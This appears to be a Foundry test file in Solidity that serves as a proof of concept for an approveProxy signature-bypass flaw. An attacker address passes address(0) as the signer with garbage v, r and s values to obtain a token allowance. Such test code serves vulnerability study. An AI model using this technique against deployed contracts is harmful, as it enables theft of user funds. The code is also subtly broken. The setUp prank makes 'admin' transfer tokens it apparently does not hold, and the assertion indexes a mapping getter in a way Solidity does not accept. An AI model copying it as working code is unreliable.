// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A13.sol";

contract ApproveProxyTokenTest is Test {
    ApproveProxyToken token;
    address admin = address(0x1);
    address attacker = address(0x2);
    address victim = address(0x3);

    function setUp() public {
        token = new ApproveProxyToken();
        vm.prank(admin);
        token.transfer(victim, 1000); // Give victim some tokens
    }

    // Test that attacker can get approval from address(0)
    function testExploitApproveProxy() public {
        // Attacker calls approveProxy with _from = address(0)
        vm.prank(attacker);
        token.approveProxy(
            address(0),      // _from = address(0)
            attacker,         // _spender = attacker
            1000,            // _value
            27,              // _v = garbage
            keccak256("r"),  // _r = garbage
            keccak256("s")    // _s = garbage
        );

        // Check if attacker got approval
        assertEq(token.allowed(address(0))[attacker], 1000);
    }
}